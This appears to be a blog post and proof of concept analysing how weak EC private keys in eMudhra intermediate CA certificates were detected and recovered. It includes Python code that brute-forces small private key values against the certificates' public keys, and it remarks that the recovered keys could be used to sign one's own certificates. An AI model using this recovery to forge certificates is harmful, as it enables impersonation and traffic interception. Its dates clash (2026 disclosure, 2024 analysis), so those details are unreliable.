# eMudhra Intermediate CA certificate compromise

In short, on October 18th 2026, a user by the name of Wayne [discovered and disclosed](https://bugzilla.mozilla.org/show_bug.cgi?id=2083449) that the Indian Certificate Authority eMudhra had unintentionally generated weakly secured certificates for their intermediate cert signing service. So weak in-fact that one of the private keys is reportedly just the integer 4... Upon hearing this I had a few questions about the situation such as:

1. What??!
2. How did Wayne identify the insecurity?
3. How did he then determine the scope and severity of the flaw?

Question 1 is more of a rhetorical question, because seriously, what??! On to question 2, according to Wayne he had been testing out the [Google Paranoid Crypto](https://github.com/google/paranoid_crypto) library against a collection of certificates when it alerted him to a weak EC key. This library was written by Google security team in 2022 and is designed to test cryptographic artifacts against a set of known flaws and weaknesses in generation algos. Using this same library we should be able to check the eMudhra certs with it and see what Wayne initially might have noticed. My third question is how did Wayne go from 'identified flaw' to determining full scope of compromise and reproducing it.

After a bit of reading up on how EC cryptography works and reviewing another POC written by [Fluepke](https://github.com/Fluepke/emudrahahahahaha) I started to build a concept of how the keys are actually flawed. In-short during the generation of the private keys the Elliptic Curve algorithm requires a typically huge integer that will be used to compute the private and public X and Y coordinate values that exist on the chosen curve. The Paranoid Crypto library comments provide a very good overview of the detection that was hit, in this instance it was the CheckWeakECPrivayKey which says:

```
class CheckWeakECPrivateKey(base_check.ECKeyCheck):
  """Checks if any keys use a weak private key.

  This method checks whether there are any keys where the private key is
  of one of the following forms:
    (1) only the 32 least significant bits are set.
    (2) only the 32 most significant bits are set.
    (3) all 32 bit words of the private key are the same.

  The test is motivated by some research that found such weak keys
  https://www.securityevaluators.com/casestudies/ethercombing/

  An observation used in the method below is that it is sufficient to
  solve DLs for the 32 least significant bits. A point of form (2) can be
  converted into a point of form (1) by a point multiplication with
  2^(-curve.bit_length() + 32) modulo the order of the curve.
  A point of form (3) can be converted into a point of form (1) by
  multiplying it with the modular inverse of (1 + 2^32 + 2^64 + ...).

  The method uses two steps. Step 1 generated a list of points with all
  the conversions. Step 2 performs a baby step giant step algorithm with
  all the generated points.

  The time and memory complexity of the methods is
     O(sqrt(#forms * #keys * 2^32))
  """
```

So in theory after Wayne ran Paranoid Crypto it was likely that he began testing to check for each of the flaws above and managed to replicate the private keys necessary to create the valid signed certificates.

After some back and forth with the python cryptography library along with the paranoid_crypto lib I was able to reproduce the steps required to identify the weak keys and then brute force them.

# eMudhra private key recovery proof-of-concept

This is a python based proof of concept that shows how we can use python with the cryptography library primitives to reproduce the flawed private keys which can then be checked against the public keys of the certificate to confirm a weak key match.

## getting paranoid

First, to replicate the entire attack I pulled down a copy of the paranoid_crypto library and set up some code to load the eMudhra .pem files and test them with the `CheckAllEC()` function. This demonstrates the paranoid_crypto library and allows us to call a specific attack depending on which weakness was identified.

```
# get the paranoid objects from x509certs
def get_paranoid(x509cert):
    pnum = x509cert.public_key().public_numbers()
    key = paranoid_pb2.ECKey()
    key.ec_info.curve_type = paranoid_pb2.CurveType.CURVE_SECP384R1
    key.ec_info.x = util.Int2Bytes(pnum.x)
    key.ec_info.y = util.Int2Bytes(pnum.y)
    return key

...


            test_key = get_paranoid(c)
            paranoid.CheckAllEC([test_key], log_level=0)
```

## making test candidate keys

Next I wanted to actually see how I can generate the private keys myself using only the existing public key data. Thankfully, if you go into the 'here be dragons' area of the python cryptography module we have a nice function to derive a private key from a specified secret number. This will be perfect for generating test candidates.

`cryptography.hazmat.primitives.asymmetric.ec.derive_private_key(private_value, curve)`


## 
Once I had the code for generating the test candidate private keys I needed to test those against the public key pulled from the certs. To do this I parsed the X and Y affine values from the EC public key and then compared those to the X and Y values from a public key generated by the test candidate private key.

```
# brute force private keys up to a stop value
def test_weak_private_keys(cert, stop=256):
    weak_nums = cert.public_key().public_numbers()
    print('\ntesting public key numbers against generated candidates')
    for i in range(1, stop):
        test_key = ec.derive_private_key(i, ec.SECP384R1())
        test_nums = test_key.public_key().public_numbers()
        wx, wy = weak_nums.x, weak_nums.y
        tx, ty = test_nums.x, test_nums.y
        if wx == tx and wy == ty:
            print(f'matching public numbers with private key value: {i}!')
            print(test_nums)
            print(weak_nums)
```

If there is an exact match in those two values then we can be certain the private key we generated is the same one capable of generating the public key that was found in the cert.

## putting it together

Combine these two features (realistically we just need the brute force) and now we've got a simple script that will audit .pem files in the `./certs` folder and run the brute force against any that trip the weak EC key test. The next step would be to write the private keys to a file and use them to sign your own certs.


## References

This was analysis was performed live on October 24th 2024 on the ReversingForFun youtube/twitch channel
 - https://youtube.com/live/l6M-OHZCReM?feature=share

Original PEM source and POC ref.
 - https://github.com/Fluepke/emudrahahahahaha

CTLogs report
 - https://ctlogs.dev/blog/emudhra-ca-compromise
 
Paranoid Crypto lib
 - https://github.com/google/paranoid_crypto/blob/main/paranoid_crypto/lib/ec_single_checks.py
